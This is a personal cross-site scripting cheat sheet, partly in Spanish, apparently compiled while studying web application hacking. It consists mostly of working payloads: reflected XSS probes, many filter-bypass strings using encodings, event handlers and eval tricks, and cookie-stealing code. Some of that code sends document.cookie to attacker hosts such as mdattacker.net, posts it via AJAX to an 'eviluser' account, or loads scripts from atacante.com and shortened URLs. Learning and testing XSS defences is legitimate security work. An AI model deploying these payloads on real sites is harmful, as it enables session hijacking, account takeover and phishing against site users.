#### XSS
An XSS can take control of a remote browser of a victim. We could from delete a specific content to the user to create a new administrator account if the user have enough privileges.

**Varieties**
- Reflected XSS
```
#you send some XSS in the url to other users as
http://mdsec.net/error/5/Error.ashx?message=Sorry%2c+an+error+occurred
##for
http://mdsec.net/error/5/Error.ashx?message=<script>alert("XSS")</script>
```
- Stored XSS

- DOM-Based XSS Vulnerabilities:
This category doens't share the characteristic of display some javascript content and execute code directly in the user browser.
>portswigger.net
>DOM-based XSS (also known as DOM XSS) arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM.

Other attack vector could be:
- Phising with a fake login page
- Defacement attacks
```
#Virtual defacement: Add some content to the page to make the user do some actions he wouldn't
<script>window.location=”http://www.pastehtml.com/Your_Defacement_link”;</script>
```
- DDoS
- XSS Worm that is propagate from web to web or even from user to user in a same web page.
- Log out the user session
- Delete some content of from the web
- Create a keylogger and get sensitive information
	```
	[Pendiente de buscar recursos]
	```
- Capture their browsing history
	```
	[Pendiente de buscar recursos]
	```
- Port Scanning the local (or not) network!
	```
	[Pendiente de buscar recursos]
	```

**Other attacks possibility**
http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html
    - deface it,
    - steal user's form values
    - redirect to form a phishing attack
    - look at cookies
    - try to send malware through a drive-by download attack

------------------------------------------
**Exploiting any Trust Relationship**
- The first is send a cookie to another domain (Example in AJAX Request)
- If the application use forms and the browser have autocomplete enabled with javascript we can get any content that the user have saved in the browser cache and send this information to the malicious server
-  ActiveX controls 

-----------------------------

- AJAX Request to obtain a session token
	```
	<script>
		d = "&to=eviluser&enviar=Enviar&mensaje=Mi cookie es: "+document.cookie;
		if(window.XMLHttpRequest)
		{
		x=new XMLHttpRequest();
		}
		else
		{
		x=new ActiveXObject('Microsoft.XMLHTTP');
		}
		x.open("POST","func/send.php",true);
		x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
		x.setRequestHeader('Content-Length',d.length);
		x.send(d);
	</script>
	```

If you discover some input where you can add html code you can try inject javascript code with:
```
# basic tests
<scrip>alert("testing XSS");</script>
<script>alert(document.cookie)</script>
%00<script>alert(1)</script>
<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; #html encode some characters

#### Open an http server in your malicious machine (python3 -m http.server)
<script>document.write('<img src="http://127.0.0.1:8000/daffi.png?cookie=' + document.cookie + '">')</script>
###or
var i=new Image; i.src=”http://mdattacker.net/”+document.cookie;

### inside a value tag
<input type="text" name="q2 value="[MyText]" />
#### for example
"/><script>alert("¡Hola Mundo!");</script><div class="

### Inside a comment
<!-- La busqueda fue "[busqueda]" -->
--><script>alert("¡Hola Mundo");</script><!-

### Code copied inside javascript tags
<script> var busqueda = "[MyText]"; </script>
#### just you need use something like
";alert("¡Hola Mundo!");//
```

To Change the cookie in your own browser you can use de plugin "EditThisCookie"


To check if XSS is a possible attack vector you have to check if in some input you can add:
```text
`
'
<
>
/
[Space]
script
onload
javascript
```



**Using AJAX requests**
- AJAX Request to obtain a session token
        ```
        <script>
                d = "&to=eviluser&enviar=Enviar&mensaje=Mi cookie es: "+document.cookie;
                if(window.XMLHttpRequest)
                {
                x=new XMLHttpRequest();
                }
                else
                {
                x=new ActiveXObject('Microsoft.XMLHTTP');
                }
                x.open("POST","func/send.php",true);
                x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
                x.setRequestHeader('Content-Length',d.length);
                x.send(d);
        </script>
        ```
The `x.open("POST","func/send.php",true);` create the POST request and with the true we indicate that the request is going to be asynchronous, that means that the browser is not going to get freeze until get the answer.
The `x.setRequestHeader` is useful to create a more sharp request indicating the headers to use


###### 	Delivery Mechanism for XSS
[Chapter 12 - The Web Appication Hacker's Book]
.
.
.
.

###### XSS examples
- Example 1: A Tag Attribute Value
```
<input type="text" name="address1" value="myxsstestdmqlwp">
	"><script>alert(1)</script>
	" onfocus="alert(1)
```

- Example 2: A JavaScript String
```
<script>var a = ‘myxsstestdmqlwp’; var b = 123; ... </script>
	‘; alert(1); var foo=’
	‘; alert(1); var foo=’//
```
- Example 3: An Attribute Containing a URL
```
<a href=”myxsstestdmqlwp”>Click here ...</a>
	javascript:alert(1);
	”onclick=”javascript:alert(1)
```



###### XSS Filters Bypass
Is common that some characters or expressions are banned in the server-side. How can we bypass it?
**Basic approach**
```text
"><script >alert(document.cookie)</script >
"><ScRiPt>alert(document.cookie)</ScRiPt>
"%3e%3cscript%3ealert(document.cookie)%3c/script%3e
"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>
%00"><script>alert(document.cookie)</script>
```

**Base64 Encode**
```
<object data="data:text/html,<script>alert(1)</script>">
	<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
	<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
	Click here</a>
```

**Events Handler**
```text
<xml onreadystatechange=alert(1)>
<style onreadystatechange=alert(1)>
<iframe onreadystatechange=alert(1)>
<object onerror=alert(1)>
<object type=image src=valid.gif onreadystatechange=alert(1)></object>
<img type=image src=valid.gif onreadystatechange=alert(1)>
<input type=image src=valid.gif onreadystatechange=alert(1)>
<isindex type=image src=valid.gif onreadystatechange=alert(1)>
<script onreadystatechange=alert(1)>
<bgsound onpropertychange=alert(1)>
<body onbeforeactivate=alert(1)>
<body onactivate=alert(1)>
<body onfocusin=alert(1)>


### HTML5
<input autofocus onfocus=alert(1)>
<input onblur=alert(1) autofocus><input autofocus>
<body onscroll=alert(1)><br><br>...<br><input autofocus>
#this allows events in closing tags
</a onmousemove=alert(1)>
#And some new tags
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

**Script pseudo protocols**
Substitute urls for an inline scritp (Could be javascript or others as 	vbs in Internet Explorer)
```
<object data=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>

### HTML5
<form id=test /><button form=test formaction=javascript:alert(1)>
<event-source src=javascript:alert(1)>
```

**CSS for XSS**
In general this is useless nowadays but it's good to know that this exists


**Bypassing filters: HTML**
```text
<img onerror=alert(1) src=a>
#######Tags#########
	<iMg onerror=alert(1) src=a>
	<[%00]img onerror=alert(1) src=a>
	<i[%00]mg onerror=alert(1) src=a>
	#arbitrary tag
	<x onclick=alert(1) src=a>Click here</x>

	#sustitute spaces!
	<img/onerror=alert(1) src=a>
	<img[%09]onerror=alert(1) src=a>
	<img[%0d]onerror=alert(1) src=a>
	<img[%0a]onerror=alert(1) src=a>
	<img/"onerror=alert(1) src=a>
	<img/'onerror=alert(1) src=a>
	<img/anyjunk/onerror=alert(1) src=a>

#######Attribute Names#########
	<img o[%00]nerror=alert(1) src=a>

#######Attribute Delimiters#########
	<img onerror="alert(1)"src=a>
	<img onerror='alert(1)'src=a>
	<img onerror=`alert(1)`src=a>	
	#Using backticks in the atributes we can disguide the event handler name
	<img src=`a`onerror=alert(1)> ##This way the server will think that the event handler es called "aonerror" an not "onerror" but the browser will understand correctly

#####Mixing sustitute spaces + attribute delimiter
	<img onerror="alert(1)"src=a>


#####Attribute values
#We can apply null byte + HTML encode
##Apply decimal and hexadecimal format and add superfluous leading zeros and ommit the trailing semicolon.
	<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
	<img onerror=a&#x06c;ert(1) src=a> #hex
	<img onerror=a&#x006c;ert(1) src=a> #hex
	<img onerror=a&#x0006c;ert(1) src=a> #hex
	<img onerror=a&#108;ert(1) src=a> #dec
	<img onerror=a&#0108;ert(1) src=a> #dec
	<img onerror=a&#108ert(1) src=a> #dec
	<img onerror=a&#0108ert(1) src=a> #dec


#script tag!
##Sometimes this works, just add rubbish to the script tag!
	<script/anyjunk>alert(1)</script>


#######Tag brackets bypass with URL encoded (Or double enconde)
<img onerror=alert(1) src=a>
	%253cimg%20onerror=alert(1)%20src=a%253e ->URL decode -> %3cimg onerror=alert(1) src=a%3e -> URL decode -> <img onerror=alert(1) src=a>

##Same happend when the application framework translate unusual unicode into the nearest ASCII equivalent
	«img onerror=alert(1) src=a» ==> %u00AB onerror=alert(1) src=a%u00BB
	##And its translated to --> <<script>alert(1);//<</script>

######Particularities of each browser
##The next execution is not correct in javascript,  but in ECMAScript for XML (E4X) but in firefox this works!
	<script<{alert(1)}/></script>
```

We have to do a mention to the "base" tag for the attack known as "base tag hijacking".
Base tag is use to force the browser to resolve an url, even if it's external, the browser resolve and it considers that this url belong to the context of the page! The allow bypass the "insite" options and load a malicious script from out own server!.
```text
<base href=”http://mdattacker.net/badscripts/”>
```
In general base tag should appear in the header of the HTML pagesbut some browsers, including Firefox allows them in anywhere.

**Character Sets**
Sometimes you can use non-standar codifications
```
<script>alert(document.cookie)</script>
####UTF-7
`+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-`
####US-ASCII
¿?¿?¿?¿?
####UTF-16
¿?¿?¿?¿?
```
The callenge here is make to the browser interpret the characters received.
- You can get this managing the _Content-type_ or its corresponding HTML metatag to force interpret this kind of codifications

**Several inputs to attack**
We have two inputs that apply that are reflected (or stored) in a webpage as:
```
<img src=”image.gif” alt=”[input1]” /> ... [input2]

##to attack
	input1:[%f0]
	input2:"onload=alert(1);
```
The **0xf0** character is used to define that the next character is composed by two bytes, that means that this is no going to interpret the quote and will not close the string, that way we can insert the input2 in the same string!


**String.fromCharCode() function**
A function in javascript that can be usefull to bypass quotes restrictions and introduce strings
Copy the next in the javascript console as example:
```
#This echo "Hola Mundo!"
String.fromCharCode(72, 111, 108, 97, 32, 77, 117, 110, 100, 111, 33)
String.fromCharCode(72,111,108,97,32,113,117,101,32,116,97,108)##Hola que tal
```

How can we convert a text in ASCII character and revers with:
```bash
#Main Function
#foo=$1
Convert2NumASCII() {
	##To use just Convert2NumASCII "a sentence here"
	foo=$1
	ordinaries=""
	for (( i=0; i<${#foo}; i++ )); do
		char=$(echo "${foo:$i:1}")
		num=$(LC_CTYPE=C printf '%d' "'$char")
		ordinaries+=$num
		ordinaries+=","
		#echo $ordinaries
	done
	#echo $ordinaries
	#ordinaries=$ordinaries | tr '\n' ', '
	#echo $ordinaries2
	echo "String.fromCharCode("${ordinaries::-1}")"
	#echo $ordinaries3
	#String.fromCharCode

}

Convert2NumASCII "Hola que tal"
```

**Use a external file**
```
<script src=http://www.atacante.com/xss.js></script>
```

**Limit in the number of character**
In case we have several inputs we could try to combined these to add more content. For that you can just comment everything in the middle between bout contents. For example:
```
Input1: <scrip/*
Input2: */>alert(1)</script>
```

Or in case we want add a file.js we can attach an url using tinyurl.com or is.gd to reduce the lenght.
`<script src=http://is.gd/owYT></script>`

**Limit in < >, quoutes, brackets or keywords**
For this we have to try create an event inside the tag we're in!
```
<input type="text" name="búsqueda" value=""
OnFocus="alert('Hola Mundo!');" />
```

- Using Javascript Escaping:
	```html
	##Unicode Escaping
	<script>a\u006cert(1);</script> ##alert(1)
	##Hexadecimal Escaping
	<script>eval('a\x6cert(1)');</script>
	#Octal Escaping
	<script>eval('a\154ert(1)');</script>

	##Escaping characters
	<script>alert('a\l\ert\(1\)');</script>
	<script>eval('a\l\ert\(1\)');</script>
	```
- Dynamically constructing Strings
	```html
	<script>eval('al'+'ert(1)');</script>
	<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
	<script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));</script>
	```
	If _eval_ is not available we can use the next alternatives:
	```html
	<script>'alert(1)'.replace(/.+/,eval)</script>
	<script>function::['alert'](1)</script>
	```
- Alternatives to dots
	```html
	<script>alert(document['cookie'])</script>
	<script>with(document)alert(cookie)</script>
	```
- Using VBScript for IE and combine it with javascript

- Using Encoded scripts
	On Internet Explorer, you can use Microsoft’s custom script-encoding algorithm
to hide the contents of scripts and potentially bypass some input filters:

- Beating Sanitization
	```
	<script><script>alert(1)</script>
	<scr<script>ipt>alert(1)</script>
	<scr<object>ipt>alert(1)</script>

	#If you can control the value foo:
	var a = ‘foo’;
	foo\’; alert(1);//
		var a = ‘foo\\’; alert(1);//’;

	</script><script>alert(1)</script>
	<script>var a = ‘</script><script>alert(1)</script>
	```

- Beating Length Limit
	http://dean.edwards.name/packer/
	- Try inject a js file from an remote resource
	'<script src=http://a></script>'
	'open(“//a/”+document.cookie)' -> Para abrir en el host a la ruta "document.cookie"
	- Try exploit several inputs to create a unique attack using comments if neccesary!
	```
	https://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal

	<input type=”hidden” name=”page_id” value=”244”>
	<input type=”hidden” name=”seed” value=”129402931”>
	<input type=”hidden” name=”mode” value=”normal”>
	
	##atack
	https://myapp.com/account.php?page_id=”><script>/*&seed=*/alert(document
.cookie);/*&mode=*/</script>

	#Result!
	<input type=”hidden” name=”page_id” value=””><script>/*”>
	<input type=”hidden” name=”seed” value=”*/alert(document.cookie);/*”>		
	<input type=”hidden” name=”mode” value=”*/</script>”>
	```

    - The third technique to bypass long limit is"convert" a reflected XSS	into DOM-based vulnerability
	```
	#Injecting this into a parameter vulenrable to reflexted XSS we can convert the XSS flaw into DOM-based vulnerability and execute then a second script located withing the fragment string
	<script>eval(location.hash.slice(1))</script>

	http://mdsec.net/error/5/Error.ashx?message=<script>eval(location.hash
.substr(1))</script>#alert(‘long script here ......’)

	##even shorter
	http://mdsec.net/error/5/Error.ashx?message=<script>eval(unescape(location))
</script>#%0Aalert(‘long script here ......’)
	```
the %0A is URL-decoded to become a newline, signaling the end of the comment.


**Scaling the attack to other application Pages**
Context, we have a XSS but in a pages where we can not exploit nothing at begin... but
If you use an iframe to cover the whole web and show the new web. This way we make the user execute the script in the top level.
Cons:
- Url never change even if we navigate over others webs -> HTML5 allow you change the url in the browser!  `window.history.pushState()`

Example of this kind of attack:
http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html

**Exploiting via cookie**
- Try to change the HTTP method and use an URL or body with a parameter with the same name that the cookie.
- If the webpage have some functionalities that allow show the cookie value in the webpage,Exploiting the vulnerability would then require the victim to be induced into making two requests: to set the required cookie containing an XSS payload, and to request the functionality where the cookie’s value is processed in an unsafe way.

- Try to use some vulenrability in the browsers that allow you add the header
- At the worst you could try to exploit another XSS attack in other webpage that makes a request to the page with a cookie (Our payload) that perform the attack.

**Exploiting XSS in the Referer Header**


###### Some more resources
```text
Cross site scripting (XSS)

#Payloads
https://github.com/payloadbox/xss-payload-list
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS

#bugbounty
##Twitter
https://hackerone.com/reports/1264834
(payload :"><img src=x onerror=alert(document.cookie);.jpg)

https://hackerone.com/reports/1601140
(%3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E)

https://hackerone.com/reports/1367642
("></script><script>alert(document.cookie)</script>)
```